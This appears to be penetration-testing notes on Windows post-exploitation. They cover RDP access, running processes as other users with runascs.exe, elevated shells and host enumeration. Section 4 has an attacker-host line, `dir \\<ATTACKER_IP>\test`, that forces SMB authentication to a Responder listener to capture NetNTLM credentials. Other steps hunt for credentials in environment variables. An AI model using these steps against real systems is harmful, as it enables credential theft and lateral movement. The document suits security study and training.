# Interactive Shell Access & Session Management

## Objective

Establish an interactive session on the target host, maximize functionality, and leverage the session for credential discovery, lateral movement, and privilege escalation.

---

## 1. Prefer RDP When Available

If the compromised account has Remote Desktop access, prefer RDP over WinRM.

```bash
xfreerdp3 /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> /dynamic-resolution /drive:sharedfolder,$(pwd)
```

> **Why?**
>
> - Full interactive desktop.
> - Easier file browsing and tool execution.
> - Avoids many Kerberos Double-Hop limitations encountered with WinRM.

---

## 2. Use `runascs.exe` to Switch Users

If valid credentials are discovered but the account is not permitted to log in via RDP or WinRM, use `runascs.exe` to execute processes under the new user's context.

Example:

```cmd
runascs.exe <DOMAIN>\<USER> <PASSWORD> cmd.exe
```

or

```cmd
runascs.exe <DOMAIN>\<USER> <PASSWORD> powershell.exe
```

> **Use Case:** Execute commands as another user without requiring an interactive logon.

---

## 3. Attempt an Elevated Shell

If administrative credentials are available, attempt to launch an elevated Command Prompt or PowerShell session.

Look for opportunities to execute:

- `cmd.exe`
- `powershell.exe`
- Administrative MMC consoles
- PsExec or other remote execution utilities

> **Goal:** Obtain an elevated shell for post-exploitation and lateral movement.

---

## 4. Test Outbound SMB Authentication

Once a shell is obtained, verify whether the host can authenticate to your listener.

Example:

```cmd
dir \\<ATTACKER_IP>\test
```

Monitor using:

- Responder (Linux)
- Inveigh (Windows)

> **Purpose:** Determine whether outbound SMB authentication is permitted and capture NetNTLM credentials if privileged users execute the command.

---

## 5. Inspect Environment Variables

Environment variables frequently reveal useful operational information.

### Command Prompt

```cmd
set
```

### PowerShell

```powershell
Get-ChildItem Env:
```

Look for:

- User profile paths
- Temporary directories
- Application configuration
- Installed software paths
- Custom variables
- Credentials accidentally stored in environment variables

---

## Quick Situational Awareness

After gaining any shell (WinRM, RDP, PsExec, Evil-WinRM, etc.), I always do this:
```cmd
whoami /all
whoami /priv
hostname
ipconfig /all
set
klist
```
These five commands immediately tell you:

- Current user
- Group memberships
- Enabled privileges (e.g., SeBackupPrivilege, SeImpersonatePrivilege)
- Hostname
- Network configuration
- Environment variables
- Cached Kerberos tickets

---

## Tips

- Prefer RDP whenever possible for a richer post-exploitation experience.
- If remote logon is restricted, try `runascs.exe` to execute commands under another user's context.
- Test outbound SMB connectivity after gaining a shell.
- Review environment variables for operational or credential-related information.

---

## Checklist

- [ ] Attempt RDP access.
- [ ] Use `runascs.exe` if alternate credentials are available.
- [ ] Attempt to obtain an elevated shell.
- [ ] Test outbound SMB authentication.
- [ ] Enumerate environment variables.
